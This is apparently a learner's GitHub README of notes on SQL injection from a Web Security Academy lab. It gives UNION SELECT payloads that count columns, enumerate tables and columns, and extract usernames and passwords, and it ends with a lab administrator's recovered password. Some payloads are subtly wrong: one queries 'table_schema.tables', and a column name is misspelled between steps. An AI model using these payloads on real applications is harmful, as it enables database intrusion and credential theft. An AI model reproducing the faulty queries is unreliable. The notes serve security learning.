# SQLi-
In this Repository will be on SQL injection which learned from Web Security Academy

# What is SQL injection (SQLi)?
SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve. This might include data that belongs to other users, or any other data that the application can access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.

In some situations, an attacker can escalate a SQL injection attack to compromise the underlying server or other back-end infrastructure. It can also enable them to perform denial-of-service attacks.

# Retrieving hidden data
Imagine a shopping application that displays products in different categories. When the user clicks on the Gifts category, their browser requests the URL:

https://insecure-website.com/products?category=Gifts
This causes the application to make a SQL query to retrieve details of the relevant products from the database:

SELECT * FROM products WHERE category = 'Gifts' AND released = 1
This SQL query asks the database to return:

all details (*)
from the products table
where the category is Gifts
and released is 1.
The restriction released = 1 is being used to hide products that are not released. We could assume for unreleased products, released = 0.

# Examining the database: SQL injection attack, listing the database contents on non-Oracle databases
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user.

# Suppose you find a SQL Injection vulnerability, but you do not know:
    table names
    column names
   database structure
Then the attack becomes a process of database enumeration.  

1. we have to check how much initial query can return columns we can  one or two:
  |--> '+UNION+SELECT+NULL--' --> for one column
  |--> '+UNION+SELECT+NULL,NULL--'  for two column

2.   then we have to know the information tables(meta data of the tables)
3.    '+UNION+SELECT+table_name,+NULL+FROM+table_schema.tables--'
        # table_schema is used for to find the metadata of the table

   then we have to manual find the table that contain the user credentials like example: 
   # users_tcadyp ---> name of the tab;le contain the credentials
4.  '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_tcadyp'--'
    shows--->     
    |---> email
    |--->password_onwjwp
    |---> username_saysjv

# Find the administrator cederitenials
'+UNION+SELECT+username_saysiv,+password_onwjwp+FROM+users_tcadyp--'
---> administrator
     5ptkbuxzohq9l6c22js3

